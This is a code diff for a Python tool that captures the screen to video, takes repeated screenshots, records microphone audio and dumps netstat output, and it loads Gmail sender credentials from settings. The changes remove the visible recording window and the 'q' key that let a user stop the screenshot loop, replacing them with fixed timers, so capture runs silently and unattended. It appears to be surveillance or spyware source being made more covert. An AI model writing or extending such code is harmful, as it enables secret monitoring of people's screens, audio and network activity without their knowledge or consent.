@@ -40,6 +40,9 @@ class BaseClass:
         self.currentDate = date.today()
         self.currentTime = datetime.now()
 
+        # General time length for timer based functions
+        self.duration = 300
+
         # Load config settings - mail and password
         self.load_dotenv = load_dotenv()
         self.gmail_address_sender = os.getenv("GMAIL_ADDRESS_SENDER")
@@ -57,12 +60,14 @@ class Webcamera(BaseClass):
     def __init__(self):
         super().__init__()  # Call the base class __init__ method
 
-        self.recording = False
-        self.duration = 300  # 5 minutes of recording
+        # Video length: 5 minutes
+        self.end_time = time.time() + self.duration
 
         # Folder path and filename
         self.folder_path = self.folder_path_recordings
-        self.output_file_name = "Recording.mp4"
+        # Generate a unique filename for the recording
+        self.current_time = time.strftime("%Y%m%d-%H%M%S")
+        self.output_file_name = f"Recording{self.current_time}.mp4"
 
     @staticmethod
     def get_screen_size():
@@ -80,22 +85,16 @@ class Webcamera(BaseClass):
             print("Unable to determine screen size")
             return 2
 
-        # Create the folder path if it doesn't exist
-        if not os.path.exists(self.folder_path):
-            os.makedirs(self.folder_path)
+        if not os.path.exists(self.folder_path_recordings):
+            os.makedirs(self.folder_path_recordings)
 
         file_path = os.path.join(self.folder_path_recordings, self.output_file_name)
 
         codec = cv2.VideoWriter_fourcc(*"mp4v")
         output = cv2.VideoWriter(file_path, codec, 30.0, screen_size)
 
-        start_time = time.time()
-        end_time = start_time + self.duration
-
-        self.recording = True
-
         # While recording is true and the recording time is below the duration
-        while self.recording and time.time() < end_time:
+        while time.time() < self.end_time:
             # Capture the screen time
             frame = pyautogui.screenshot()
             frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
@@ -103,11 +102,7 @@ class Webcamera(BaseClass):
             # Write the frame to the output video file
             output.write(frame)
 
-            cv2.imshow('Screen Recording', frame)
-
-        self.recording = False
         output.release()
-        cv2.destroyAllWindows()
 
 
 class Screenshot(BaseClass):
@@ -118,9 +113,14 @@ class Screenshot(BaseClass):
         self.counter = 0
         self.sleepAmount = 1
 
+        # Timer for taking screenshots
+        self.end_time = time.time() + self.duration
+
         # Folder path and folder name
         self.folder_path = self.folder_path_screenshots
-        self.folder_name = f"Subfolder{date.today(), datetime.now()}"
+        # Generate a unique filename for the sub-folders
+        self.current_time = time.strftime("%Y%m%d-%H%M%S")
+        self.folder_name = f"Subfolder{self.current_time}"
         self.image = None
 
     def create_subfolder(self):
@@ -133,7 +133,7 @@ class Screenshot(BaseClass):
     def screenshot(self):
         subfolder_path = self.create_subfolder()
 
-        while True:
+        while time.time() < self.end_time:
             try:
                 self.image = ImageGrab.grab()
             except Exception as e:
@@ -154,11 +154,6 @@ class Screenshot(BaseClass):
             # Flush the output to display immediately
             sys.stdout.flush()
 
-            # Check if the 'Esc' key is pressed
-            if keyboard.is_pressed('q') or keyboard.is_pressed('Q'):
-                print("Program stopped by user.")
-                break
-
             time.sleep(self.sleepAmount)
 
 
@@ -169,7 +164,6 @@ class Microphone(BaseClass):
         # Constants for audio settings
         self.audio_data = None
         self.sample_rate = 44100  # Normal wave length for normal sound quality
-        self.duration = 300  # Duration in seconds
 
         # Folder path and filename
         self.folder_path = self.folder_path_soundfiles
@@ -346,6 +340,10 @@ class CmdPrompts(BaseClass):
                 raise Exception("Unsupported platform")
         except Exception as e:
             print(f"An error occurred: {str(e)}")
+
+        # Create the folder path if it doesn't exist
+        if not os.path.exists(self.folder_path):
+            os.makedirs(self.folder_path)
 
         # Open/Create file path
         file_path = os.path.join(self.folder_path, self.netstat_output_file_name)
